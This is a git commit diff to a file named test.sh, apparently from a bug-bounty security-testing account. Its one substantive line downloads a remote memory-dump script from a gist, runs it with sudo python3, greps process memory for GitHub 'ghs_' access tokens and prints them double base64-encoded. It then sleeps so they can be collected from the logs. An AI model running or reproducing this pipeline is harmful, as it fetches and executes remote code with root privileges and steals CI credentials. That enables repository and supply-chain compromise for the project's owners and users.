b507582d2e51a78267d52fb56a74ff8e0de21367
sectest-h1-adnanthekhan <136088118+sectest-h1-adnanthekhan@users.noreply.github.com>
2023-06-29 21:05:54 -0400

    Update test.sh

--- test.sh
+++ test.sh
@@ -2,5 +2,4 @@
 
 BASE64=`curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 -w 0 | base64 -w 0`
 
-echo $BASE64
-sleep 600
+echo $BASE64 && sleep 600
